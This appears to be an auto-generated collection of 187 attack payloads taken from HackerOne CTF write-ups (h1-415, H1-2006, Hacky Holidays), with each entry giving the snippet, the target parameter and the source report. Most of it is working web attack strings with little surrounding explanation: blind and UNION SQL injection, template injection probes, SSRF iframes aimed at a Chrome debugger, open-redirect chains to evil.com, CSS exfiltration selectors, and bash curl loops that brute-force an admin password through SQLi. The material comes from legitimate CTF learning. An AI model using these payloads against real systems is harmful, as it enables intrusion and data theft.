# h1-ctf

187 payloads.

### `6222a05a`

```
The user 16 is now able to make a document conversion. The output document will contains an iframe with data from http://localhost:9222.

# Chrome debugger API opened

The Chrome debugger API is enabled and can be accessed through the SSRF from the previous step. There are both a Websocket API (complete) and a JSON API (limited) that allows to retrieve data from this interface.

By using the JSON api, hitting the */json/list* endpoint, we can see every tabs that are currently opened, with associ
```

**Parameter:** `name`
— [\[h1-415 2020\] My writeup on how to retrieve the special secret document](https://hackerone.com/reports/776684) · h1-ctf · [blaklis](https://hackerone.com/blaklis)

### `3e6e10c5`

```
http://localhost:9222
```

— [\[h1-415 2020\] My writeup on how to retrieve the special secret document](https://hackerone.com/reports/776684) · h1-ctf · [blaklis](https://hackerone.com/blaklis)

### `235d43a0`

```
{{7*7}}
```

**Parameter:** `name`
— [\[h1-415 2020\] H1-415 CTF Writeup by W--](https://hackerone.com/reports/780285) · h1-ctf · [w--](https://hackerone.com/w--)

### `25e301c1`

```
${7*7}
```

**Parameter:** `name`
— [\[h1-415 2020\] H1-415 CTF Writeup by W--](https://hackerone.com/reports/780285) · h1-ctf · [w--](https://hackerone.com/w--)

### `4bc08895`

```
http://target.com/url/demo/../test
```

— [\[h1-415 2020\] H1-415 CTF Writeup by W--](https://hackerone.com/reports/780285) · h1-ctf · [w--](https://hackerone.com/w--)

### `fc2604ef`

```
Referer: http://localhost:3000/
```

**Parameter:** `Referer`
— [\[h1-415 2020\] h1ctf{y3s_1m_c0sm1c_n0w}](https://hackerone.com/reports/781253) · h1-ctf · [pirateducky](https://hackerone.com/pirateducky)

### `e9730358`

```
<iframe src='http://localhost:9222 width=900 height=900></iframe>
```

**Parameter:** `content`
— [\[h1-415 2020\] h1ctf{y3s_1m_c0sm1c_n0w}](https://hackerone.com/reports/781253) · h1-ctf · [pirateducky](https://hackerone.com/pirateducky)

### `d5464337`

```
<iframe src='http://localhost:9222/json width=900 height=900></iframe>
```

— [\[h1-415 2020\] h1ctf{y3s_1m_c0sm1c_n0w}](https://hackerone.com/reports/781253) · h1-ctf · [pirateducky](https://hackerone.com/pirateducky)

### `8f70850c`

```
https://target.com/record-data?name=path&data=
```

— [\[h1-415 2020\] SSRF in a headless chrome with remote debugging leads to sensible information leak](https://hackerone.com/reports/781295) · h1-ctf · [d1r3wolf](https://hackerone.com/d1r3wolf)

### `207df1ce`

```
https://target.com/static/js/new.js
```

— [\[h1-415 2020\] SSRF in a headless chrome with remote debugging leads to sensible information leak](https://hackerone.com/reports/781295) · h1-ctf · [d1r3wolf](https://hackerone.com/d1r3wolf)

### `f5d45b8b`

```
$i {
    background-image: url(https://target.com/$i);
}
```

— [\[H1-2006 2020\]  The Story of Making Bounty Hunters Happy](https://hackerone.com/reports/889333) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `9af0334e`

```
input[name^=$i] ~ *{
    background-image: url(https://target.com/exfil/$i);
}
```

— [\[H1-2006 2020\]  The Story of Making Bounty Hunters Happy](https://hackerone.com/reports/889333) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `d3fa2d5d`

```
{
    "url": "https:\/\/target.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/evil.com\/#\/\/statements?month=03&year=2020",
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"style
```

**Parameter:** `url`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)

### `3ad0324e`

```
{
    "url": "https:\/\/target.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/evil.com\/uploads\/#\/\/statements?month=03&year=2020",
    "data": "<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><
```

**Parameter:** `url`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)

### `a5578309`

```
{"account_id":"F8gHiqSdpK/../../../redirect?url=https://target.com/
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)

### `ca08ddda`

```
https://target.com/redirect?url=https://evil.com/search?q=REST+API
```

**Parameter:** `url`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)

### `4366f0d0`

```
{
    "url": "https:\/\/target.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/evil.com\/#\/\/statements?month=03&year=2020",
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"style
```

**Parameter:** `url`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)

### `68d76cc0`

```
{
    "url": "https:\/\/target.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/evil.com\/uploads\/#\/\/statements?month=03&year=2020",
    "data": "<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><
```

**Parameter:** `url`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)

### `5466928e`

```
{"account_id":"F8gHiqSdpK/../../../redirect?url=https://target.com/
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)

### `74e6cfe7`

```
https://target.com/redirect?url=https://evil.com/search?q=REST+API+SUFFIX
```

**Parameter:** `url`
— [\[H1-2006 2020\] CTF writeup](https://hackerone.com/reports/892632) · h1-ctf · [0xbeefed](https://hackerone.com/0xbeefed)

### `73274637`

```
https://target.com/redirect?url=https://evil.com
```

**Parameter:** `url`
— [\[H1-2006 2020\] CTF writeup](https://hackerone.com/reports/892632) · h1-ctf · [0xbeefed](https://hackerone.com/0xbeefed)

### `def37dc7`

```
https://target.com/api/accounts/../../redirect?url=https://evil.com/#/statements?month=03&year=2020
```

**Parameter:** `url`
— [\[H1-2006 2020\] CTF writeup](https://hackerone.com/reports/892632) · h1-ctf · [0xbeefed](https://hackerone.com/0xbeefed)

### `95ffce09`

```
https://target.com/api/accounts/../../redirect?url=https://evil.com/#/statements?month=03&year=2020
```

**Parameter:** `url`
— [\[H1-2006 2020\] CTF writeup](https://hackerone.com/reports/892632) · h1-ctf · [0xbeefed](https://hackerone.com/0xbeefed)

### `9ae0b81f`

```
<@base64_2>{"account_id":"../../redirect?url=https://target.com/search?q=REST+API#","hash":0}<@/base64_2>
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)

### `b9de9e0a`

```
<@base64_2>{"account_id":"../../redirect?url=https://target.com/#","hash":0}<@/base64_2>
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)

### `539a82b3`

```
<@base64_2>{"account_id":"../../redirect?url=https://target.com/uploads/BountyPay.apk#","hash":0}<@/base64_2>
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)

### `254f007e`

```
https://target.com/admin/report?url=Lz90ZW1wbGF0ZT1ob21l
```

**Parameter:** `url`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)

### `b8005ddd`

```
<@base64_2>{"account_id":"../../redirect?url=https://target.com/search?q=REST+API#","hash":0}<@/base64_2>
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)

### `a10cb09e`

```
<@base64_2>{"account_id":"../../redirect?url=https://target.com/#","hash":0}<@/base64_2>
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)

### `73211d2d`

```
<@base64_2>{"account_id":"../../redirect?url=https://target.com/uploads/BountyPay.apk#","hash":0}<@/base64_2>
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)

### `cf8edaee`

```
https://target.com/redirect?url=...
```

**Parameter:** `url`
— [@shakedko H1-2006 CTF writeup](https://hackerone.com/reports/894623) · h1-ctf · [shakedko](https://hackerone.com/shakedko)

### `f1c4682a`

```
"url":"https:\/\/target.com\/api\/accounts\/..\/..\/F8gHiqSdpK\/statements?month=05&year=2020"
```

— [\[H1-2006 2020\] From multiple vulnerabilities to complete ATO on any customer account and staff admin](https://hackerone.com/reports/894863) · h1-ctf · [rreiss](https://hackerone.com/rreiss)

### `42e8f9d1`

```
{
    "url": "https:\/\/target.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/?\/statements?month=01&year=2020",
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>BountyPay | Login<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n<div class=\"container\">\
```

**Parameter:** `url`
— [\[H1-2006 2020\] Multiple vulnerabilities allow to leak sensitive information ](https://hackerone.com/reports/895202) · h1-ctf · [zoczus](https://hackerone.com/zoczus)

### `2d005a79`

```
{
    "url": "https:\/\/target.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/evil.com\/&\/statements?month=01&year=2020",
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesh
```

**Parameter:** `url`
— [\[H1-2006 2020\] Multiple vulnerabilities allow to leak sensitive information ](https://hackerone.com/reports/895202) · h1-ctf · [zoczus](https://hackerone.com/zoczus)

### `c5aaba21`

```
{
   "url":"https:\/\/target.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/evil.com\/\/statements?month=01&year=2020",
   "data":"<html>\n<head><title>404 Not Found<\/title><\/head>\n<body>\n<center><h1>404 Not Found<\/h1><\/center>\n<hr><center>nginx\/1.15.8<\/center>\n<\/body>\n<\/html>"
}
```

**Parameter:** `url`
— [\[h1-2006 2020\]  Chained vulnerabilities lead to account takeover](https://hackerone.com/reports/895650) · h1-ctf · [kanytu](https://hackerone.com/kanytu)

### `37f647fb`

```
{"url":"https:\/\/target.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/evil.com\/uploads?\/statements?month=01&year=2020","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

**Parameter:** `url`
— [\[h1-2006 2020\]  Chained vulnerabilities lead to account takeover](https://hackerone.com/reports/895650) · h1-ctf · [kanytu](https://hackerone.com/kanytu)

### `813a7043`

```
app_style=https%3A%2F%2Fevil.com%2Fcss%2Funi_2fa_style.css
```

**Parameter:** `app_style`
— [\[h1-2006 2020\]  Chained vulnerabilities lead to account takeover](https://hackerone.com/reports/895650) · h1-ctf · [kanytu](https://hackerone.com/kanytu)

### `42ddbd04`

```
https://target.com/redirect?url=https://evil.com?q=REST+API
```

**Parameter:** `url`
— [\[h1-2006 2020\]  Chained vulnerabilities lead to account takeover](https://hackerone.com/reports/895650) · h1-ctf · [kanytu](https://hackerone.com/kanytu)

### `2e7cf954`

```
{
   "url":"https:\/\/target.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/evil.com\/\/statements?month=01&year=2020",
   "data":"<html>\n<head><title>404 Not Found<\/title><\/head>\n<body>\n<center><h1>404 Not Found<\/h1><\/center>\n<hr><center>nginx\/1.15.8<\/center>\n<\/body>\n<\/html>"
}
```

**Parameter:** `url`
— [\[h1-2006 2020\]  Chained vulnerabilities lead to account takeover](https://hackerone.com/reports/895650) · h1-ctf · [kanytu](https://hackerone.com/kanytu)

### `8e2b1c95`

```
{"url":"https:\/\/target.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/evil.com\/uploads?\/statements?month=01&year=2020","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

**Parameter:** `url`
— [\[h1-2006 2020\]  Chained vulnerabilities lead to account takeover](https://hackerone.com/reports/895650) · h1-ctf · [kanytu](https://hackerone.com/kanytu)

### `81f2b638`

```
https://target.com/redirect?url=https://evil.com/search?q=REST+API.
```

**Parameter:** `url`
— [\[h1-2006 2020\] Write up for H1-2006 CTF](https://hackerone.com/reports/895772) · h1-ctf · [zer0ttl](https://hackerone.com/zer0ttl)

### `7240a40e`

```
https://target.com/import.css
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `8f5227c9`

```
https://target.com/body
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `e07c4c85`

```
https://target.com/input
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `29c809c4`

```
https://target.com/div
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `9472256c`

```
https://target.com/button
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `c859c483`

```
https://target.com/inputa
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `d23bc996`

```
https://target.com/inputb
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `fba96ceb`

```
https://target.com/input8
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `4ebe66be`

```
https://target.com/input9
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `3b61ee6a`

```
https://target.com/input{}{}
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `186d83a6`

```
https://target.com/inputcode{}_{}
```

— [\[H1-2006 2020\] Bounty Pay CTF challenge](https://hackerone.com/reports/895798) · h1-ctf · [0xfd](https://hackerone.com/0xfd)

### `e1b1470a`

```
http://127.0.0.1:8080
```

— [Hackyholidays CTF writeup](https://hackerone.com/reports/1065583) · h1-ctf · [xehle](https://hackerone.com/xehle)

### `491e22a4`

```
preview_markup=Hello {{name}} ....asd&preview_data={"name":"Alice","email":"alice@test.com"}
```

**Parameter:** `preview_markup`
— [Hackyholidays CTF writeup](https://hackerone.com/reports/1065583) · h1-ctf · [xehle](https://hackerone.com/xehle)

### `39c219c9`

```
{{template:38dhs_admins_only_header.html  }}
```

— [Hackyholidays CTF writeup](https://hackerone.com/reports/1065583) · h1-ctf · [xehle](https://hackerone.com/xehle)

### `b154936a`

```
' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) = 113-- -
```

— [Invading Grinch Network and Saving Christmas](https://hackerone.com/reports/1065829) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `88006c95`

```
' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 113-- -
```

— [Invading Grinch Network and Saving Christmas](https://hackerone.com/reports/1065829) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `6172c212`

```
test' AND (ascii(substr((SELECT password FROM quiz.admin LIMIT 0,1),1,1))) = 112--  -
```

— [Invading Grinch Network and Saving Christmas](https://hackerone.com/reports/1065829) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `9819109e`

```
' UNION SELECT "' union select 1,2,'../api/user?username=grinch'#",1,2#
```

— [Invading Grinch Network and Saving Christmas](https://hackerone.com/reports/1065829) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `4436cf7d`

```
' UNION SELECT "' union select 1,2,'../api/user?username=grincha$$%&password=%25'#",1,2#
```

— [Invading Grinch Network and Saving Christmas](https://hackerone.com/reports/1065829) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `669a19f2`

```
w31rd0' OR 1=1-- -
```

— [Invading Grinch Network and Saving Christmas](https://hackerone.com/reports/1065829) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `da3ce4a1`

```
target.com
```

— [Complete destruction of the Grinch server](https://hackerone.com/reports/1065885) · h1-ctf · [shamollash](https://hackerone.com/shamollash)

### `47d922f3`

```
name=NOME' or 22=1 or '2'='1  ---> There is 0 other player(s) with the same name as you!
name=NOME' or  1=1 or '2'='1  ---> There is 24358 other player(s) with the same name as you
```

**Parameter:** `name`
— [Complete destruction of the Grinch server](https://hackerone.com/reports/1065885) · h1-ctf · [shamollash](https://hackerone.com/shamollash)

### `11647e02`

```
...
[17:19:23] [INFO] POST parameter 'name' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
...
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: name=-3268' OR 6136=6136-- ibKa
    Vector: OR [INFERENCE]
```

**Parameter:** `name`
— [Complete destruction of the Grinch server](https://hackerone.com/reports/1065885) · h1-ctf · [shamollash](https://hackerone.com/shamollash)

### `40a6cee5`

```
GET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+1,NULL,NULL--+- HTTP/1.1
Host: target.com

[picture from album 1 returned]  <--- THIS IS THE KEY DISCOVERY!!!
```

**Parameter:** `hash`
— [Complete destruction of the Grinch server](https://hackerone.com/reports/1065885) · h1-ctf · [shamollash](https://hackerone.com/shamollash)

### `e6c7a864`

```
grinch' or '1'='(Select column_name FROM all_tables WHERE table_name like 'a%')--
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `1a510009`

```
grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'a%' LIMIT 0,1) -- -
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `9c4088d4`

```
grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'admin' LIMIT 0,1) -- -
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `123c402f`

```
grinch' or 1=( SELECT 1 FROM information_schema.columns WHERE table_name='admin' AND column_name like 'username%' LIMIT 0,1) -- -
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `b2236cc0`

```
grinch' or 1=( SELECT 1 FROM admin WHERE username like 'admi%' LIMIT 0,1) -- -
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `58784572`

```
https://target.com/r3c0n_server_4fdk59/album?hash=-8436' UNION ALL SELECT NULL,NULL,GROUP_CONCAT(UNION ALL SELECT NULL,NULL,NULL) FROM information_schema.tables WHERE table_name like 'a%'-- -
```

**Parameter:** `hash`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `984276bf`

```
UNION ALL SELECT NULL,NULL,( UNION ALL SELECT NULL,NULL,NULL)-- -
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `57b152be`

```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,1 -- -",'12',1-- -
```

**Parameter:** `hash`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `e36372a5`

```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username={}%' -- -",'12',1-- -
```

**Parameter:** `hash`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `a4535d1d`

```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username=grinchadmin%26password={}%' -- -",'12',1-- -
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `80b5f673`

```
grinch' or '1'='1
```

**Parameter:** `name`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `bbb8e515`

```
grinch' or '1'='2
```

**Parameter:** `name`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `2d162fd5`

```
value='{"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}'
```

**Parameter:** `preview_data`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `e2eaa67a`

```
{{name}}
```

**Parameter:** `preview_data`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `e36d376d`

```
{{template:RANDOMTHINGS}}
```

**Parameter:** `preview_data`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `1e7d97d0`

```
{{email}}
```

**Parameter:** `preview_data`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `78763a16`

```
{{template:<TEMPLATE_NAME>}}
```

**Parameter:** `preview_data`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `a22f60fb`

```
Hi {{name}}
```

**Parameter:** `preview_markup`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `6ebb9891`

```
99' OR 1=1-- -
```

— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `edee42b3`

```
99' OR 5=1-- -
```

— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `5766c0c9`

```
{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```

**Parameter:** `preview_markup`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `1f033cca`

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: target.com

preview_markup=Hello{{name}}+....+whatever&preview_data={"name":"Alice","email":"alice@test.com"}
```

**Parameter:** `preview_markup`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `34acefe3`

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: target.com
preview_markup=Hello+{{name}}+email:+{{email}}&preview_data={"name":"zonduu","email":"murphy@hacktheplanet.com"}
```

**Parameter:** `preview_markup`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `0a99309a`

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: target.com
preview_markup={{flag}}&preview_data={"flag":"{{template:38dhs_admins_only_header.html}}"}
```

**Parameter:** `preview_markup`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `7fa4de3d`

```
while read line; do
        curl -s -k "https://target.com/r3c0n_server_4fdk59/album?hash=jasda59grop%27+UNION+SELECT+%222%27+UNION+SELECT+1,1,%27../api/${line}%27+--+-%22,%2712%27,1--+-" | grep '" src=".*"' -o | sed 's/" src="//' | sed 's/"//' | sed 's/^/https\:\/\/target.com/' | anew valid-endpoints > /dev/null;
done < api.txt

while read line; do
        curl -s -k "${line}" > output;
        if cat output | grep 'Invalid content type detected' > /dev/null; then
    
```

**Parameter:** `hash`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `de712df7`

```
# chr function to get ascii chars
chr() {
  [ "$1" -lt 256 ] || return 1
  printf "\\$(printf '%03o' "$1")"
}

while true
do
        for x in {48..57} {97..122};
        do
                letter=$(chr $x);
                #letter=$(urlencode "$letter");
                new="$dis";
                url=$(curl -s -k "https://target.com/r3c0n_server_4fdk59/album?hash=jasda59grop%27+UNION+SELECT+%222%27+UNION+SELECT+1,1,%27../api/user?username=${new}${letter}%25%27+--+-%22,%2712%27,1--+
```

**Parameter:** `hash`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `df974e67`

```
{{template:cbdj3_grinch_header.html}}
```

— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `e6f1213a`

```
{{template:cbdj3_grinch_footer.html}}
```

— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `1accee53`

```
?username=grinchadmin%26password=${new}${letter}%25
```

**Parameter:** `username`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `f74a428e`

```
Got the salt as `mrgrinch463`, the hash is calculated by `md5(salt+ip)`.
So we can create payload for any ip, here is script I created {F1132732} to generate the payload
I created payload for ip `127.0.0.1` ( I have to take down the grinch) and sent it in `payload` parameter.
```

**Parameter:** `payload`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)

### `3d848634`

```
Got resposne,
{F1132737}
There is some protection for hitiing localhost so we have to bypass that protection.
Any address we give it first resolves it into an IP address then performs attack. 
There is a cool attack called [DNS-rebinding][33]
[33]: https://target.com/wiki/DNS_rebinding   "DNS-rebinding"
Here I used [https://evil.com/taviso/rbndr][34] to perform DNS-rebinding, using `evil2.com` to create payload
[34]: https://evil.com/taviso/rbndr    "https://evil.com
```

**Parameter:** `payload`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)

### `dbf1907d`

```
I sent `secretasecretaadmin.phpdmin.phpdmin.php` as data, this string does not contain any special character the `preg_replace` does not affect the data.
On first replace it replaces any occurrences `admin.php` with nothing so makes data as `secretasecretadmin.phpdmin.php`.
And finally, when it replaces any occurrences of `secretadmin.php` with nothing, the final result becomes `secretadmin.php`.
